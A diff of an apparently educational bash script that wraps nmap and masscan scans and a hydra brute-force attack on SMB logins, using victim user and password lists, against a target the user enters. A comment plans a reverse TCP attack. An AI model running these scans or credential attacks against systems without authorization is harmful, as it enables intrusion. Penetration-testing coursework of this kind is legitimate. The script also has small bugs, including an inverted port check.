@@ -57,51 +57,85 @@ menu
 function  chkme()
 #allow the user to choose different scans and attacks
 {
+echo -e "Before conducting scans or attacks please provide the requested inputs.\n"
+	
+read -p "Please provide a target IP(s) or hostname(s) for nmap. (e.g Can be a specific ip or range, for example 10.0.0.1 or 10.0.0.1/24):" tgtIP
+		
+read -p "Please provide the target port(s). (e.g ENTER for null, can be a specific port, ports or port range, 80, 22,53,80,443 or 100-8080): " tgtport
+
+echo -e "\nYou have entered $tgtIP as the target ip or ip range.\n"
+		
+echo -e "\nYou have entered $tgtport as the target port or port range for masscan.\n"
+
 echo -e "\nPlease select the process you would like to start."
-echo -e "\n1) Conduct an nmap scan. \n2) Conduct a masscan. \n3) Conduct an attack 1. \n4) Conduct an attack 2 \n0) To quit.\n"
+
+echo -e "\n1) Conduct an nmap scan. \n2) Conduct a masscan. \n3) Conduct a hydra attack. \n4) Conduct an attack 2 \n0) To quit.\n"
+
 read CHOICE2
 echo -e "\nYou chose option $CHOICE2.\n"
 case $CHOICE2 in
 
 	1)
-		echo -e "Conducting an nmap scan. Please provide the requested inputs.\n "
+	#check to see if there is a target port
+	
+	if [[ -n "$tgtport" ]]
+	then
+	echo -e "Conducting an nmap scan.......\n "
+	#Run nmap scan ans save the output to a file
+			nmap -Pn -sV "$tgtIP" -oN nmapscan_output
+	else
+	echo -e "Conducting an nmap scan.......\n "
+	#With port inputs
+			nmap -Pn -sV -p "$tgtport" "$tgtIP" -oN nmapscan_output
+	fi
 		
-		read -p "Please provide a target IP(s) or hostname(s) for nmap. (e.g Can be a specific ip or range, for example 192.168.1.1 or 192.168.1.0/24):" nmaptgtIP
+		echo "\n Scan outputs have been saved to this working directory as nmapscan_output.\n"
 		
-		echo "You have entered $nmaptgtIP as the target ip or ip range for nmap."
-		
-		read -p "Please provide the target port(s) for nmap. (e.g Can be a specific port or port range, 80 or 100 -8080):" nmaptgtport
-		
-		echo -e "\nYou have entered $nmaptgtport as the target port or port range for nmap. \n Executing nmap scan......."
-		
-		#Run nmap scan ans save the output to a file
-		sudo nmap -v -p "$nmaptgtport" -O "$nmaptgtIP" -oN nmapscan_output
-		
+		menu
 		;;
 
-	2)
-		echo -e "Conducting a masscan. Please provide the requested inputs.\n"
+	2) 
+		echo -e "\nYou have selected to conduct a masscan. Please provide the requested inputs.\n"
+	
+	#check to see if there is a target port
+	
+	if [[ -n "$tgtport" ]]
+	then
+	echo -e "\nConducting a masscan........\n"
+		#With port inputs
+			sudo masscan "$tgtIP" -p "$tgtport" > masscan_output
+	else
+	read -p "For masscan, you must specify a target port or port range. [hint] try something like "-p80,8000-9000": " mstgtport
+	
+	echo -e "\nYou have specified $mstgtport as the target port or port range.\n"
+	
+	echo -e "\nConducting a masscan........\n"
+	#Run nmap scan ans save the output to a file
+			sudo masscan "$tgtIP" -p "$mstgtport" > masscan_output
+	fi
+
+		echo -e "\nScan outputs have been saved to this working directory as massscan_output.\n"
 		
-		read -p "Please provide a target IP(s) or hostname(s) for masscan. (e.g Can be a specific ip or range, for example 192.168.1.1 or 192.168.1.0/24):" mstgtIP
-		
-		echo -e "\nYou have entered $mstgtIP as the target ip or ip range for masscan.\n"
-		
-		read -p "Please provide the target port(s) for masscan. (e.g Can be a specific port, ports or port range, 80, 22,53,80,443 or 100-8080):" mstgtport
-		
-		echo -e "\nYou have entered $mstgtport as the target port or port range for masscan.\n \nExecuting masscan........"
-		
-		#Executed the masscan.
-		sudo masscan "$mstgtIP" -p "$mstgtport" > masscan_output
-		
+		menu
 		;;
 
-	3)	echo "Conducting an attack 1"
+	3)	echo -e "\nConduct a hydra attack on the target.\n"
+					
+		#Get list of ports from nmapscan_output
+		#cat nmapscan_output | grep tcp | awk -F "/" '{print($1)}' | grep -x -E '[[:digit:]]+'
+		hydra -L victimuser.lst -P victimpassword.lst $tgtIP smb -vV -o hydra_output
+		
+		echo -e "\nScan outputs have been saved to this working directory as hydra_output.\n"
+		
+		menu
 		;;
 	
 	4)	echo "Conducting an attack 2"
 		;;
+		
+#Stretch goal reverse tcp attack.		
 
-	0)	echo "Quit" 
+	0)	echo "Goodbye" 
 				exit
 		;;
 	
@@ -110,7 +144,6 @@ case $CHOICE2 in
 	esac
 }
 
-1
 #~ function LOGIT()
 #~ #use this function to save results such as date, time, IPs, kind of attack.
 #~ {
@@ -120,4 +153,6 @@ case $CHOICE2 in
 #3. Log executed Attacks
 #Every scan or attack should be logged and saved with the date and used arguments.
 
+#Create all the necessary files in the system to avoid errors.
+touch nmapscan_output massscan_output hydra_output
 menu
